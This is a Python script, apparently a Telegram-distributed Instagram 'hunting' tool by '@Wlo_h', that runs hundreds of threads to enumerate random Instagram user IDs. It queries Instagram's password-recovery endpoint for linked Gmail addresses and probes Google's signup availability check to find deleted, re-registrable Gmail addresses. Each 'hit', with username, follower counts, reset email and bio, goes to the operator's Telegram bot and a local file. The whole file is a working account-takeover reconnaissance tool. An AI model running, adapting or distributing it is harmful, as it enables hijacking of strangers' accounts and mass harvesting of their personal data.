
import lzma
import zlib
import codecs
import base64
import gzip 
import hashlib 
import bz2
import marshal 
import time
from datetime import datetime
current_time = datetime.now()
expiry_time = datetime.strptime('''2025-12-30 9:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('\x1b[38;5;20m ➔ \x1b[38;5;48m توقفت اعذرني + ما ابيع بيه ')
    exit(0)
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import requests
# قائمة الرسائل العشوائية
random_messages =[
    '''إذا غامرتَ في شرفٍ مرومِ ... فلا تقنعْ بما دونَ النجومِ''',
    '''ولرب نازلة يضيق بها الفتى ... ذرعاً وعند الله منها المخرجُ''',
    '''على قدر أهل العزم تأتي العزائمُ ... وتأتي على قدر الكرام المكارمُ''',
    '''إنما الأمم الأخلاق ما بقيت ... فإن همُ ذهبت أخلاقهم ذهبوا''',
    '''وما نيل المطالب بالتمني ... ولكن تؤخذ الدنيا غلابا''''''
'ماشفت الخسارة بكل الاحوال أنه المافوز بيها اتعلملها ،''','''انَـا ليِلي بلايه واهَس ما أنَـام
شَلون لو صِرت انتَه واهس ليِلي .''','''ثگلت بروحِي جثة ومَا لگت جَناز''','''انَـا ليِلي بلايه واهَس ما أنَـام
شَلون لو صِرت انتَه واهس ليِلي .''','''نشف ريج الدمع 
هاك اخذ عيني برساله''','''ها أنا ذا مُجدداً ..
أرثيّ نفسيّ
على على ما ضّاع،
أتخذ زوايا غرفتيّ
الفارغة محطة،
أخلَع الملامح
الحادة الهادِئة 
وأبكي ..
أبكي مثّل بُكاء طفل رضيّع
يئِن وجعاً ولا أُمً تعرف وجعهُ.''','''شِلون أوصفّك؟
وأنتَ دفتِر وأنه چلمَه
يلِي مأ جأسّك فِكُر بألليّل
ولأ چاسَك سَهّر
يلِي بيّن حواجبَك غفوهَ نهِر
يلِي جره سمهَ بعينك
خاف افززِهَأ من أگلك
انـهَ أحبّك مأمش بمَأمش
وللمَأمِش يميزأن الذهب
وأدغـش واحبّك ✨🤍''','''يهنيال الشارع ألشابع بخطواتك''','''واذا تطلب عِيوني وداعتك هاك
عِمت عين العِيون الما تشوفك .''','''عود دلوك الدرب بس ضيعوك
وخذو التمرات وانطوك النوهـ''','''تالــي طبگــو بابهم وبنار 
فشلتنه انچوينه''','''صَاير ما تِحن كلش هالأيام 
وحِيل تغيرت بيك المَودة .''','''عطشان واجه ، دنك بجرفي و راح
يسئلونه  ارتويت يكلهم انطيته ،''','''خليـچ يمَي غغيرچ أبد ماريـَد .''','''عيونج هلالین و گمر
كل ليلة حسنچ يزداد
خدج مثل مي وشكر
ومحلي دمج العِناد
محلى صفاتج والشعر،
ما اريد أشبهج بالبشر
يا حلوة چنچ بغداد•''','''قَد حِرتٌ في جَمال عَيناك مُتعجباً
ايُعقَل أن أعيُن يوسَف قَد تَوارثَت ؟''','''اكبر غلط كبرتك بنص الروح الصنم كبرو راسه سمو تمثال ،''','''شايل خلگ دكتور يوميهَ أخيط جرح .''','''حَچيك عَالگلُب دوسة حَوافِر خَيل''','''اسألني وَاني اختِصر لِعيونك المدَة
طلِع شعندَك حَچي عنِدي بَچي بكدَة .''','''ولَكنني أُحبك
حتى عِندما أكون يائساً
ومُتعَباً 
أُحبك.. لأن تلك النُّدوب
تتلاشى بِجانبك .''','''كَفَراشة كُلما لَمَسَت مَكَانًا أضَاءَتهُ 🦋''','''شني معاشر فحم 
شو كل ذكرياتك سود''','''يا صدفة التلمني وياك
واشريها بثمن عمري''','''وَ صيت الهوىٰ يحاچيِك يَذكرڪ بـَ إلي ماناسيڪ ♥...''','''تعال اشتاقلي بگدي 
إذا ما ارسم عيونك ؏ الشباگ 
هذا الليل مَيعدي 
ولأن ما عندي غيرك 
اشكي حزني وياه
جنت ابچيلك لوحدي''','''يهنيال ذيج المنطقه شابعه بشوفة عيونج .''','''والدُنيا ضاگت والنفس 
بـَاقي عَلى گد الحَسرة
فرحَان داويت الغُصن 
ثــَاري المـرض بـَالشجرة''','''واگول انَسَاكْ
بس شَنسَاك ؟
شِنساهن ،
اگلب بالصَوُر
واتگلب وياهن .''','''أيا وردتي الي أذبلت 
بأول عُمرها 
يا وسفتي مَالحگت 
أشتم عُطرها''','''الچان يحبني
لا يمكن ولا چان !
اليحضُن روحه يشبه ورد ذبلان
ياروحي عليچ هواي زَعلان 
رماد بنار صرتيله وتغنين
تَغطيت وبعَدني 
الليلة بردان .''','''من اموت اريد يحطون على گبري علامة استفهام
لأن حرفياً كل شي مافهمت من حياتي''',
'''على عيوني التعبّ گاعِد غراب وينهش بجِثة .''','''و الكُّل يُكتَمُ و الهوىٰ لا يُكتَمُ
 إنَّ العيونَ إذا هوت تَتَكَلّمُ.''','''هل يـَاترى لو كُنت انسى مـَاجرى ! 
يُحتاج مِني كرهكُم قلبًا قوياً ثائراً مُتمردا''','''ماشفت الخسارة بكل الاحوال أنه المافوز بيها اتعلملها ،''',
'''خليـچ يمَي غغيرچ أبد ماريـَد .''','''يا نجمتي
سعادتك هي سعادتي
و لذة حديثك تكفيني .. 
و سرورك يسرني
أريدك في سنواتي القادمة
ودنياي الحاضره
یا ملجأي وطمأنينة قلبي
سأخبئك كالثروة في قلبي .''','''اسألني وَاني اختِصر لِعيونك المدَة
طلِع شعندَك حَچي عنِدي بَچي بكدَة .''','''حَچيك عَالگلُب دوسة حَوافِر خَيل''','''شايل خلگ دكتور يوميهَ أخيط جرح .''','''اكبر غلط كبرتك بنص الروح الصنم كبرو راسه سمو تمثال ،''','''حقك ما شفت شكد
جان طبعك بارد
من جنت اجيلك محترك
والكاك حيل تعاند
من جان عندك جم محب
وماعندي غيرك واحد
كل ذني مو صوجك ترى
صوج اهتمامي الزايد.''','''نسولف بيك لـ أخر لحظه بالليل
وترد من الصُبح تشغل فِكرنه ..''','''مَـن تُوصل للكَرامه ادُوسَك وأعبر  .''','''وأهَس ليَل جرحّي
شكَد سوالف بي 
عليهْ كُل ذكرة مَرت
تنحَسب لچمه 
هَوت روحَي وهَوت 
، بـس ماهَوتها النّاس 
حجَي ؏ـيوني سهَل 
بس جَيب اليفهمة .''','''وكوَنَ ندرَي
بَالعتاب يفيد بيهمَ 
عاتبينَا
وكونَ يسَوون البچي 
چا بثنعش نَاضرَ بچينَه''','''المَوعد عبر بس مجبور اتانيك 
بعدني اتوقعك تنشاف بالعين
بردت ساعتي وغطيت الارقام
بس ضلوعي تدفى شلون ومنين ؟''','''‏- الهاضمتني عيونك
الصارن محطة لناس ما تهوى السفر"''','''مَخلوقين بَس لِلشوف، 
ما جِسنَا النِريدَه بيوم !''','''ضَلت بكيفك هسهّ كُلشي أتضح
أختار ياحَل لمزاجك سَلس 
أتريد تبقى ، تريد تمشيّ بزعل
هذا آنه ، باچر والوراه مِثل أمس''','''أنا الخواف يا دنيا
 أنا الخواف من كلشي''','''أكره الخوف وأخاف على الناس من شعور الخوف، و أرى أنه من أسوأ المشاعر التي قد تجعل الإنسان يعيش بصورة لا تشبه شخصه و يتحدث بنبرة لا تشبه صوته''','''الَقي بنظره الى الخَلف فَاتجمد !
أي مَجزرة تَلكَ ألتي خَرجتُ مَنها حَياً ؟''','''لا أعلم ، أنتِ
تتجولين بمخيلتي
منذ الصباح
إبتسامتكِ ، عيناكِ ،
مشهدك وأنتِ
تسيرين
تلك اللحظات عالقة
بمخيلتي.''','''انتِ الوحيدة
الهيچ عاملتيني
اي بشر من انفعل
ما يحچي وياي
بعز انفعالي
وانتِ ضحكتيني''','''ياهو أنتَ ؟ 
وعَليك أبچي بتوالي الليل وشنو تنزل دموعي لخاطرك أنتَ؟
غيرك يحلم أحچي وياه مو أشتاگ 
يحفُظ شكو بروحي ويفهَم البيه''','''لُو تِلبَس شَمِس بعد
 ما تِترِس عيُوني ،''','''- ‏حَديثُها لذَيذّ . . 
مِثل ، وَجبّة إفطار صائِم بعد جوعٌ شَديدّ  .''','''- فكرة التواجد معكَ تجعلني أقوى تجعلني أستطيِع أن اواجُه إي شيء مهما كانت صعُوبتة حتى قلبي يُصبح خفيفاً بِخفة الفراشات .''',]

def get_random_message():
    return random.choice(random_messages)

def send_message():
        kremcc = get_random_message()
send_message()

import webbrowser
#webbrowser.open("https://t.me/Wlo_h")
init(autoreset=True)
E = '\033[1;31m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
S = '\033[2;36m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
S = '\033[2;36m'
G = '\033[1;34m' 
HH='\033[1;34m' 
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m'

INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')


GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tl.txt'
haidar_domain = '@gmail.com' 

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}
from cfonts import render                
haidar = render('  السيد ', colors=['yellow', 'green'], align='center')
print("\x1b[1;31m—" * 9)
print(haidar)
print('\x1b[1;31m  × ')
print("\x1b[1;31m  ╰─ \x1b[1;34m   السيد \x1b[1;35m•\x1b[1;34m @Wlo_h \x1b[1;35m•\x1b[1;34m Haidar ")
print("\x1b[1;33m—" * 9)
kkk=f'''{C}


 _           _     _            
| |__   __ _(_) __| | __ _ _ __ 
| '_ \ / _` | |/ _` |/ _` | '__|
| | | | (_| | | (_| | (_| | |   
|_| |_|\__,_|_|\__,_|\__,_|_|

{HH}═════════════════════════════════════════════════════════
          السيد  يحبكم قدرو التعب وشاركو القناة بروح اهلكم استمتعو يروحي 🌚🎋     .•´¯•.¸¸
{HH}═════════════════════════════════════════════════════════
 '''
print(kkk)

print('\x1b[1;31m     × ')
ID = input('\033[2;36mID :\033[2;35m > \033[1;33m ')
os.system('clear')
print("\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print('\x1b[1;31m    × ')
TOKEN = input('\033[2;32mToKen:\033[1;31m > \033[1;34m ')
os.system('clear')
print(f"""\033[2;32m @Wlo_h ☆ @Wlo_h ∆ @Wlo_h ☆ https://t.me/Wlo_h ∆
 \033[1;31m❥\033[2;32m----------------------------------------------------
 \033[1;33m
 
مرحباً بكم في اداة  المطور  السيد صيد  كله عالي فما فوق🌚

\033[2;35m  ╔════════════════════════════════════════╗  
║          ✦ اداة عمك  السيد ✦         ║  
  ╠════════════════════════════════════════╣  
\033[2;34m║  🔹 قناة المطور: @Wlo_h                 ║  
║  🔹 حساب المطور: @Wlo_h                  ║  
║.                                    🌚🥶  ║  
 ║  🔹 رابط قناتي تلي https://t.me/Wlo_h     ║  
║  🔹 رابط قناتي الاحتياط https://t.me/MRTermux22    ║  
 \033[2;35m ╚════════════════════════════════════════╝

\033[2;31m❥\033[2;32m-----------------------------------------------------
\033[2;36m
/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\\

 _           _     _            
| |__   __ _(_) __| | __ _ _ __ 
| '_ \ / _` | |/ _` |/ _` | '__|
| | | | (_| | | (_| | (_| | |   
|_| |_|\__,_|_|\__,_|\__,_|_|



\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/﹉\_/

\033[1;31m❥\033[1;32m\033[2;3m-----------------------------------------------------
؞           ؞
        """)

# تحقق من صحة التوكن
def check_token_validity():
    try:
        response = requests.get(f"https://api.telegram.org/bot{TOKEN}/getMe")
        if response.status_code == 200:
            print(f"{green}[✓] توكن البوت صحيح")
            return True
        else:
            print(f"{red}[✗] توكن البوت غير صحيح")
            return False
    except Exception:
        print(f"{red}[✗] حدث خطأ أثناء التحقق من توكن البوت")
        return False

# التحقق من صحة التوكن
if not check_token_validity():
    print("يرجى التحقق من توكن البوت وإعادة تشغيل البرنامج")
    sys.exit()

try:
    requests.post(f"""https://api.telegram.org/bot{TOKEN}/sendvideo?chat_id={ID}&parse_mode=Markdown&video=https://t.me/Wlo_h/656&caption= - Haidar : [المبرمج](@Wlo_h))""")
except Exception:
    pass

secim = print(f"""
{cyan} ━━━━━━━━━━━━━━━━━━━━━━━
 
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 1\x1b[1;33m - \x1b[1;31m2011
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 2\x1b[1;33m - \x1b[1;31m2012
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 3\x1b[1;33m - \x1b[1;31m2013
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 4\x1b[1;33m - \x1b[1;31m2014
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 5\x1b[1;33m - \x1b[1;31m2015
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 6\x1b[1;33m - \x1b[1;31m2016
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 7\x1b[1;33m - \x1b[1;31m2017
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 8\x1b[1;33m - \x1b[1;31m2018
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 9\x1b[1;33m - \x1b[1;31m2019
\x1b[1;31m  [\x1b[1;32m>\x1b[1;31m] \x1b[1;34m 0\x1b[1;33m - \x1b[1;31m2011 \x1b[1;35m• \x1b[1;31m 2019

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")

haidar = input(f"{green}\x1b[1;34m اختار ༻ ")
os.system('clear')
if haidar == '1':
    bbk = 10000
    id = 17699999
elif haidar == '2':
    bbk = 17699999
    id = 263014407
elif haidar == '3':
    bbk = 263014407
    id = 361365133
elif haidar == '4':
    bbk = 361365133
    id = 1629010000
elif haidar == '5':
    bbk = 1629010000
    id = 2500000000
elif haidar == '6':
    bbk = 2500000000
    id = 3713668786
elif haidar == '7':
    bbk = 3713668786
    id = 5699785217
elif haidar == '8':
    bbk = 5699785217
    id = 8597939245
elif haidar == '9':
    bbk = 8597939245
    id = 21254029834
elif haidar == '0':
    bbk = 10000
    id = 21254029834
else:
    exit()
    
def pppp():
    os.system('cls' if os.name == "nt" else "clear")
    ge = hits              
    bt = bad_insta + bad_email 
    be = good_ig            
    print(f"\r{F}    Hits{HH} : {M}{ge} ~ {Z} Bad İg {HH} : {M}{bt} ~ {X} Good İg {HH} : {M}{be} {G}   [  السيد ] ")

def update_stats():
    pppp()

def haidar():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        haidar()

haidar()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + haidar_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM
    }
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                      json.dumps({
                          '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                          'adid': uui,
                          'guid': uui,
                          'device_id': device_id,
                          'query': email
                      })),
        IG_SIG_KEY_VERSION: '4'
    }
    response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
    if email in response:
        if haidar_domain in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                          '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                          '"device_id":"android-b93ddb37e983481c",'
                          '"query":"' + user + '"}'),
            IG_SIG_KEY_VERSION: '4'
        }
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
        haidarporno = response.get('email', 'Reset None')
    except:
        haidarporno = 'Reset None'
    return haidarporno

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

# دالة إرسال الرسائل إلى تلجرام
def send_to_telegram(message_text):
    try:
        # تجزئة الرسالة إذا كانت طويلة جدًا
        if len(message_text) > 4000:
            # إرسال رسالة مختصرة
            username = message_text.split("يوز حساب : ")[1].split("\n")[0] if "يوز حساب : " in message_text else "غير معروف"
            domain = message_text.split("جميل : ")[1].split("\n")[0] if "جميل : " in message_text else "غير معروف"
            simple_message = f"تم اصطياد حساب جديد: {username}@{domain}\nراجع ملف Haidar.txt للتفاصيل الكاملة"
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={simple_message}"
        else:
            # تشفير النص لتجنب مشاكل الأحرف الخاصة
            encoded_message = requests.utils.quote(message_text)
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={encoded_message}"
        
        response = requests.get(url, timeout=10)
        
        if response.status_code != 200:
            print(f"فشل إرسال الرسالة: {response.text}")
            # محاولة إرسال رسالة أبسط في حالة الفشل
            simple_message = "تم اصطياد حساب جديد - راجع ملف Haidar.txt"
            simple_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={simple_message}"
            requests.get(simple_url, timeout=10)
            
        return True
    except Exception as e:
        print(f"خطأ في إرسال الرسالة: {str(e)}")
        return False

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 'غير متوفر')
    full_name = account_info.get('full_name', 'غير متوفر')
    followers = account_info.get('follower_count', 50)
    following = account_info.get('following_count', 0)
    posts = account_info.get('media_count', 0)
    bio = account_info.get('biography', 'غير متوفر')
    reset_email = rest(username)
    total_hits += 1
    kremcc = get_random_message()
    
    info_text=f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀
═════حيادر══════════════
BY : ➩   :  @Wlo_h / @Wlo_h •
════haidar═══════════════
🧸𝙷𝙸𝚃 ☊ : {total_hits}   -----> @Wlo_h
🧸𝙶𝙼𝙰𝙸𝙻 : {username}@{domain}
🧸𝚁𝙴𝚂𝚃𝙴𝚃: {reset_email}-----> @Wlo_h
🧸𝙽𝙰𝙼𝙴 : {full_name}-----> @Wlo_h
🧸𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁:{followers}-----> @Wlo_h
🧸𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶: {following}-----> @Wlo_h
🧸𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :{username}-----> @Wlo_h
🧸𝙳𝙰𝚃𝙴 : (HR)-----> @Wlo_h
🧸𝙿𝚁𝙸𝚅𝙰𝚃𝙴 :{posts}-----> @Wlo_h
🧸𝚒𝚗𝚏𝚘 : https://www.instagram.com/{username}?igsh=bXRmcXUyMXVxM3Mx
🧸𝙱𝙸𝙾 : {bio}
════حيادر══════@Wlo_h═════════
شعر هديه مني الك : {kremcc}

════حيادر══════@Wlo_h════════


        '''.format(kremcc)
    
    # حفظ البيانات محليًا
    with open('Haidar.txt', 'a', encoding='utf-8') as f:
        f.write(info_text + "\n")
    
    # إرسال إلى تلجرام مع تأخير بسيط لتجHنب الحظر
    time.sleep(0.3)
    send_to_telegram(info_text)

def haidar_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(bbk, id)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                infoinsta[username] = account
                emails = [username + haidar_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass

# دالة البحث الإضافية
def search():
    while True:
        crf = "".join(random.choice('qwertyuiopRyjNkxiogUiaejkJbc7907422') for _ in range(32))
        headers = {'x-fb-lsd': crf}
        data = {
            'lsd': crf,
            'variables': json.dumps({"id": random.randint(900990001, 25000000000), "render_surface": "PROFILE"}),
            'server_timestamps': 'true',
            'doc_id': '9304100213006404',
        }
        try:
            r = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
            try:
                user = r['data']['user']['username']
                ur = r['data']['user']['following_count']
                if user and ur > 200:
                    print(f' - User : {user} ¦ Following : {ur} ')
                    # يمكنك إضافة فحص البريد الإلكتروني هنا إذا كنت ترغب
                    check(user + haidar_domain)
            except Exception:
                pass
        except Exception:
            pass

# تشغيل الخيوط الرئيسية للبحث
print(f"{green}[H] تم تشغيل الصيد @Wlo_h...")
print(f"{cyan}[H] ثواني اروح اجيبلك حسابات واجي ...")

# تشغيل الخيوط للدالة الرئيسية
for _ in range(200):
    Thread(target=haidar_python).start()

# تشغيل خيوط البحث الإضافية
for i in range(15):
    Thread(target=search).start()

# تحديث الإحصائيات كل 5 ثوانٍ
def update_stats_periodically():
    while True:
        update_stats()
        time.sleep(5)

# تشغيل خيط لتحديث الإحصائيات
Thread(target=update_stats_periodically, daemon=True).start()

